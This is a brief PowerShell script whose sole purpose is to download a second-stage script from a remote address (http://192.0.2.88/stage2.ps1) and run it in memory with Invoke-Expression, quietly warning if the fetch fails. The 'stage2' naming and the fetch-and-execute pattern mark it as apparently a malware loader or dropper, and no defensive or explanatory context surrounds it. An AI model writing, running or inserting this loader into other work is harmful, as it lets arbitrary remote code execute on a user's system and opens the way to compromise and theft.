[CmdletBinding()]
param(
    [string]$Stage2Url = "http://192.0.2.88/stage2.ps1",
    [int]$TransferTimeout = 63
)
try { IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing).Content; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Remote fetch failed" }
